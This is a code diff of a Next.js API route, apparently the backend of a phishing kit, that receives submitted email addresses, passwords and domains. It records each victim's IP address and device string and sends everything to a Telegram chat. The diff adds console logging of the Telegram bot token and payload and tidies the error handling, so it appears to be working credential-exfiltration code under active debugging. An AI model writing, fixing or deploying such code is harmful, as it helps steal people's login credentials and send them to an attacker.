@@ -1,9 +1,17 @@
 // app/api/log-submit/route.ts
+export const runtime = 'nodejs';
+
 import { NextRequest, NextResponse } from 'next/server'
 import { logToTelegram } from '../../../lib/telegramLogger'
 
 export async function POST(req: NextRequest) {
   try {
+    // 1) Debug your Telegram env
+    console.log('> Telegram ENV:', {
+      TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN,
+      TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID,
+    })
+
     const body = await req.json()
     const { email, password, domain } = body
 
@@ -14,16 +22,12 @@ export async function POST(req: NextRequest) {
       )
     }
 
-    // Get timestamp
+    // 2) Gather metadata
     const timestamp = new Date().toISOString()
-
-    // Get IP address
     const ip =
       req.headers.get('x-forwarded-for') ||
-      req.ip || // fallback
+      (req as any).ip || // fallback
       'Unknown IP'
-
-    // Get user-agent
     const userAgent = req.headers.get('user-agent') || 'Unknown device'
 
     const message = `
@@ -36,13 +40,21 @@ export async function POST(req: NextRequest) {
 💻 Device: ${userAgent}
     `.trim()
 
-    await logToTelegram(message)
+    // 3) Debug the exact payload
+    console.log('> Telegram payload:', JSON.stringify({
+      chat_id: process.env.TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'Markdown'
+    }))
+
+    // 4) Fire off the Telegram log (will throw on non-2xx if you modified logToTelegram)
+    await logToTelegram(message /*, false for Markdown, or true for HTML */)
 
     return NextResponse.json({ ok: true })
-  } catch (error) {
-    console.error('Telegram log error:', error)
+  } catch (error: any) {
+    console.error('💥 Telegram log error:', error)
     return NextResponse.json(
-      { error: 'Failed to log to Telegram' },
+      { error: error.message || 'Failed to log to Telegram' },
       { status: 500 }
     )
   }
